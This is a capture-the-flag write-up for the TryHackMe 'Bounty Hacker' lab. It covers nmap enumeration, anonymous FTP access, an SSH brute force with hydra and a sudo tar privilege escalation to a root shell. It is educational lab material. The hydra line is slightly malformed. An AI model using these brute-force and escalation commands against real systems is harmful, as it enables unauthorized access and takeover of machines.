### Bounty Hacker CTF Writeup

## Link: https://tryhackme.com/room/cowboyhacker

Our first step is to always begin with enumeration, we can use alot of tools to do this but we are going to use the most popular enumeration tool called 'Nmap' 

`┌──(--㉿kali)-[~]
└─$ nmap 10.10.81.164 -sV -sC
`



`
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3




`
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
`



`
80/tcp open  http    Apache httpd 2.4.18 
`



From this Nmap scan we see that there are 3 ports open: port 21, 22 and 80
Importantly, we see that on port 21 there is 'Anonymous FTP login allowed' (This means that we can login as user anonymous and provide no password)


### The web-server:

If he head over to the website running this machine (which you can access by going to http://<machine_ip>) we are greeted by this main page:

![image](https://github.com/traveller404/Bounty-Hacker-CTF-/assets/92340426/757a9125-6535-4cee-af12-d83a835361d5)

Reading through this we are greeted by characters called Spike, Jet, Ed and Faye and we also learn of 2 other people called Edward and Ein.
These could be possible usernames for the ssh service running on port 22.

Inspecting the source code of the webpage reveals nothing ontop of this.

### The FTP service:

Log into the FTP service on the machine with the following command:

ftp <machine_ip>

Connected to 10.10.81.164.
Name (10.10.81.164:--): anonymous

230 Login successful.

Using `ls` we can see the files on this ftp service and we are told there are 2 .txt files, tasks.txt and locks.txt
Use `mget *` as a means to get all files to your local device then exit the ftp service

### SSH Access

The contents of task.txt contain another person, Lin, but locks.txt is more useful
It is a file containing presumably passwords, and with the list of potential usernames we collected earlier from the website and Lin from task.txt, its time to commence a brute force attack

To do this attack we must make a file containing the usernames, which for convenience sake we will call users.txt and then write our command

`hydra -l users.txt -P locks.txt ssh://<machine_ip -V>`

SUCCESS!!! 
We now have a username and password

### Privelege Escalation

`ssh lin@<machine_ip>`

Logging on we see the first flag, which you can get yourself
But we are not done, we need to get the root flag, which we dont have access to, we need to escalate our privelleges
Using `sudo -l` we can see what we can run as sudo, which is tar, go to https://gtfobins.github.io/# and search up tar, I will let you do this on your own

If you have found the right command it should be 
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

Executing this gives us root permissions, meaning we have full control over the machine
Change to /root and get the flag

I hope this helps!!
